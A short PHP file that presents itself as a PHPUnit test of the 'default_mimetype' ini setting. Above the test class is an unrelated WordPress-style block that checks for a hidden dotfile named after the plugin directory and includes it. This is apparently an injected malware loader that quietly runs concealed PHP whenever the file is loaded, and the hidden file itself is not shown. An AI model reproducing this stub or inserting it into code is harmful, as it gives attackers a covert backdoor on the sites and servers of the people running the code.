<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class IniTest extends PHPUnit_Framework_TestCase
{
    public function testIni()
    {
        $this->assertEquals('application/x-test', ini_get('default_mimetype'));
    }
}
